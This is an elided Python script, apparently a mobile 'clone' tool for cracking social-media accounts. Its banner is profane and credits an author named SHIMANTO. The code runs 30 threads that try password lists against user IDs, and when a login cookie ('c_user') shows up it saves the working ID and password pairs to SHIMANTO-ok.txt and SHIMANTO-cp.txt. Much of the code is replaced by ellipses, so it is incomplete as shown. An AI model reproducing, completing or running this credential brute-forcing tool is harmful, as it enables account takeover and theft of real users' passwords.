#Sc Make By XAIKO-SHIMANTO
#Gift By SHIMANTO
#Github= SHIMANTO-404-CYBER
...
#________Logo__________#
 ...
 HI GUYS I AM FUCK YOUR NANI 😑
 NEW TOLL NUMBAR UID+GMAIL CLONE
""")
...
def asha():
    ...
    with ThreadPool(max_workers=30) as raifa:
        ...
        print('[+] Save As /sdcard/SHIMANTO-ok.txt')
        print('[!] Save As /Sdacrd/SHIMANTO-cp.txt')
...
def sabina(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r\033[m[SHIMANTO] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                open('/sdcard/SHIMANTO-ok.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
                ...
                open('/sdcard/SHIMANTO-cp.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(ids)
                break
            else:
                continue
